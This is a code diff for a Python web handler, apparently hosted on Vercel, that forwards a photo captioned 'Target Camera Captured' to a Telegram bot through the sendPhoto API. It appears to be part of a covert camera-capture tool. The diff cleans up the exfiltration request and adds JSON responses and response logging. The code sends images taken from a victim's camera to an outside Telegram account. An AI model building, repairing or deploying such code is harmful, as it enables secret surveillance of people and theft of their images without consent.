@@ -24,13 +24,18 @@ class handler(BaseHTTPRequestHandler):
                     'caption': '📸 **Target Camera Captured via Vercel**',
                     'parse_mode': 'Markdown'
                 }
-                requests.post(f'https://api.gateway.telegram.org/bot{BOT_TOKEN}/sendPhoto' if False else f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data_payload, files=files)
                 
+                # Telegram API request
+                response = requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data_payload, files=files)
+                print("Telegram Response:", response.text)
+
             self.send_response(200)
+            self.send_header('Content-type', 'application/json')
             self.end_headers()
-            self.wfile.write(b'OK')
+            self.wfile.write(json.dumps({"status": "success"}).encode())
         except Exception as e:
             self.send_response(500)
+            self.send_header('Content-type', 'application/json')
             self.end_headers()
-            self.wfile.write(str(e).encode())
+            self.wfile.write(json.dumps({"error": str(e)}).encode())
             
